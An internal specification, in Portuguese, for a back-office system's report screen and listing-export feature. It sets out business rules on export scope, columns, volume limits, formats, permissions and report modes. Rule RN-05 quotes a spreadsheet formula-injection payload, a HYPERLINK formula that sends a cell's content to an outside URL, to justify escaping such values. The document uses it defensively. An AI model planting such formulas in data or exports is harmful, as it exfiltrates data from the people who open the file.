# Relatórios e exportação de listagens

**Onde fica:** Menu → Sistema → Relatórios (`/retaguarda/relatorios`) · e o botão **Exportar** de
toda listagem da Retaguarda (`POST /retaguarda/exportar-listagem`).
**Quem usa:** administrador e gestor (a tela de Relatórios); o botão Exportar acompanha a listagem
que a pessoa já pode ver.

São **duas coisas diferentes**, e a confusão entre elas custa retrabalho:

| | **Exportação de listagem** | **Relatório** |
|---|---|---|
| O que é | Conveniência: levar para fora o que está na tela | Documento oficial, pedido de propósito |
| De onde vêm os dados | Do **recorte visível** que a tela mandou | De consulta própria, com período e totais |
| Onde vive | `ExportacaoListagemController` + `<BotaoExportar>` | `app/Relatorios/` + tela de Relatórios |

Os dois compartilham o **motor**: um resultado neutro (`ResultadoRelatorio`) e três exportadores
(PDF, XLSX, DOCX). Nenhuma tela gera arquivo por conta própria.

---

## Regras vigentes

### RN-01 — Toda listagem exporta, e o que sai é o RECORTE VISÍVEL

Toda aba "Localizar" e toda grade nasce com o botão **Exportar** (PDF / Excel / Word). O arquivo
contém o que o filtro, a busca e a aba deixaram na tela — **nunca** o universo, **nunca** só a
página atual.

As listagens filtram no navegador, então **quem manda as linhas é a tela**: passe o resultado já
filtrado (`ord.itens`), não o da página visível. Paginação é artifício de visualização; o filtro é a
intenção de quem pediu.

Se este endpoint refizesse a consulta no banco, o arquivo divergiria do que está na tela — e quem
exportou levaria um documento que não confere com o que viu.

### RN-02 — O recorte vai IMPRESSO no documento

Todo arquivo carrega: título, caminho no menu, o recorte em palavras (aba + busca + filtros), o
volume (`N registro(s) exportado(s)`), quem emitiu e quando. Sem isso, semanas depois ninguém sabe
se aquelas linhas eram "todas", "só as ativas" ou o resultado de uma busca.

### RN-03 — O pedido vai no CORPO do POST, nunca na URL

Filtros carregam texto livre. Na query string, um `--` ou uma aspa cai na regra do WAF da
Prefeitura, que barra a requisição — e a falha chega ao navegador **disfarçada de erro de CORS**.
Por isso a exportação e a emissão são POST com o pedido no corpo.

### RN-04 — Só as colunas DECLARADAS entram no arquivo

A tela costuma passar o objeto inteiro de cada linha. Apenas as chaves declaradas em `colunas` são
lidas: `id` e marcas internas de controle **não vazam** para dentro de um documento que sai do
sistema. Campo ausente vira **travessão** — célula vazia no meio da tabela parece erro de geração.

### RN-05 — Conteúdo que parece fórmula NÃO vira fórmula

Texto que começa com `=`, `+`, `-` ou `@` é gravado na planilha como **texto explícito**. O
conteúdo vem do banco (apelido digitado em rua, relato de fiscalização, razão social): sem isso,
bastaria alguém gravar `=HYPERLINK("http://…"&A1)` num campo para o Excel executar aquilo na
máquina de quem abrisse o arquivo. Número continua número, para não quebrar soma e ordenação.

### RN-06 — Teto de volume, com recusa que diz o que fazer

Até **5.000 linhas** e **30 colunas** por exportação. Acima disso a recusa é explícita ("Refine o
filtro e tente de novo") e aparece na tela — download que simplesmente não acontece parece o
sistema travado.

### RN-07 — Data SEMPRE em BR, também nos arquivos

`dd/mm/aaaa` em tela, em PDF, em planilha e em documento. A formatação das células da listagem é
responsabilidade da **tela** (o documento tem de sair igual ao que estava nela); nos relatórios, de
quem monta o relatório.

O PDF usa a fonte **DejaVu Sans**, e não o alias `sans-serif`: o alias cai numa fonte limitada à
tabela Windows-1252, e aí seta (→), separador de caminho (›) e travessão (—) saem como `?` no
arquivo entregue.

### RN-08 — Cada formato entrega um conjunto de dados PRÓPRIO

Os três formatos não são o mesmo dado reembalado:

| Formato | O que ele traz de exclusivo |
|---|---|
| **PDF** | Análise de distribuição: gráfico + participação percentual e percentual acumulado por categoria |
| **XLSX** | Planilha analítica: Nº e "Dias desde <data>" por linha, aba **Resumo** com o pivô Mês/Ano × categoria, cabeçalho congelado e autofiltro |
| **DOCX** | Documento gerencial: parágrafo de contexto + **Síntese executiva** (mais antigo, mais recente, amplitude, média por dia, categoria menos frequente) |

A derivação é **incondicional**: recorte sem coluna de data faz os campos temporais saírem "—", mas
o perfil de cada formato continua saindo. E os conjuntos exclusivos são **disjuntos** — nenhum campo
exclusivo de um formato aparece em outro. As duas coisas são cobertas por teste
(`ExportacaoPerfilPorFormatoTest`), porque é o que sustenta os três como saídas distintas na análise
de ponto de função.

### RN-09 — Exportar não é fronteira de dados

A exportação devolve o que a tela já entregou: a autorização aconteceu no `GET` que montou a
listagem. Por isso a rota está declarada como **livre** em `config/permissao_acoes.php`, com o
motivo escrito — e não como uma permissão própria. Uma segunda permissão para a mesma decisão ("quem
vê esta listagem") um dia discordaria da primeira: a tela abriria e o botão recusaria, ou o
contrário.

Já a **tela de Relatórios** é tela: entra no catálogo do Modo Gerente (slug `relatorios`) e é
concedida por setor, como qualquer outra.

### RN-10 — Relatório declara os próprios filtros; a tela só desenha

Cada relatório é uma classe que diz quem é (título, grupo, descrição), quais filtros a tela deve
renderizar e quais modos aceita. A tela de Relatórios desenha o formulário a partir dessa descrição
— relatório novo aparece pela própria existência no catálogo, sem uma linha de front.

Entrar no catálogo é ato explícito (uma linha em `RegistroRelatorios`): documento oficial que sai do
sistema não deve aparecer na tela só porque o arquivo existe.

### RN-11 — Período invertido é recusado, não devolvido vazio

Data inicial posterior à final devolveria um documento **vazio**, que quem pediu leria como "não
houve movimento" — e não como "você trocou as datas". A recusa nomeia os dois campos.

### RN-12 — O modo muda a pergunta que o relatório responde

- **Analítico** — responde *quem*: traz a relação nominal, linha a linha, para conferência.
- **Gerencial** — responde *quanto*: só os quadros de totais (e gráfico, quando houver). A lista
  nominal afogaria o número que se foi buscar.

### RN-13 — Relatório de Usuários do sistema: uma conta em dois setores conta nos dois

No quadro "Contas por setor", quem pertence a dois setores é contado nos **dois**: a pergunta é
"quantas contas este setor alcança", e ela não se responde dividindo gente pela metade. A soma das
linhas pode, portanto, passar do total — que é o número de contas e vem da linha TOTAL. Conta **sem
setor** tem linha própria: ela não enxerga tela controlada nenhuma, e é o caso que mais importa
nessa leitura.

### RN-14 — Relatório de Permissionários: as três situações sempre aparecem, mesmo zeradas

O quadro "Cadastros por situação" traz **Regular, Irregular e Cadastrado em campo** ainda que alguma
esteja em zero: "nenhum aguardando conferência" é uma resposta de gestão, e uma linha ausente seria
lida como "não sei". Já o quadro **por atividade** mostra só os ramos que aparecem, do maior para o
menor — ali o zero atrapalha, porque a lista de atividades é aberta e dezenas de linhas vazias
esconderiam as que têm gente.

O documento sai **deitado** (são oito colunas), com o documento **formatado** e as datas em BR. Sem
documento é o caso normal deste cadastro, não um defeito: sai como travessão.

Ele **convive** com o de Usuários do sistema, e não substitui nenhum: um responde quem **usa** o
sistema, o outro quem **é fiscalizado**.

---

## Changelog

| Data | Autor | Tela | Alteração | Motivo |
|---|---|---|---|---|
| 25/08/2026 | José Nascimento | Relatórios / exportação de listagens | Criação do motor de relatórios (resultado neutro + exportadores PDF/XLSX/DOCX), do endpoint único de exportação de listagem com `<BotaoExportar>`, do perfil de dados por formato e do primeiro relatório concreto (Usuários do sistema). | A Retaguarda não tinha como levar dado nenhum para fora, e cada tela que precisasse disso inventaria a sua própria geração de arquivo. |
| 25/08/2026 | José Nascimento | Relatórios | Novo relatório "Permissionários cadastrados" (RN-14): período de cadastro, situação e atividade, com quadro por situação e por ramo. | Faltava responder "quem está na base e o que ainda espera conferência" — pergunta de gestão que o relatório de contas do sistema não responde. |
